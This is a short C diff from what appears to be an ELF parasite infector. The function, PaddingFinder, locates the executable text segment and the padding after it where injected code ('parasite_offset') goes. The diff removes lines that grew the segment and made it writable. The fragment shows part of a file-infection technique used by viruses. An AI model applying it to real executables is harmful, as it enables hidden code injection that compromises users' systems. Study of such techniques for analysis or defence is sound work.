@@ -42,9 +42,6 @@ Elf64_Off	PaddingFinder(void *ptr)
 			phdr[i].p_flags == (PF_R | PF_X))
 		{
 			TEXT_SEGMENT_FOUND = 1;
-			phdr[i].p_filesz = phdr[i].p_filesz + strlen(message);
-			phdr[i].p_memsz  = phdr[i].p_memsz  + strlen(message);
-			phdr[i].p_flags = PF_R | PF_W | PF_X;
 			parasite_offset = phdr[i].p_offset + phdr[i].p_filesz;
 		}
 		else if (TEXT_SEGMENT_FOUND)
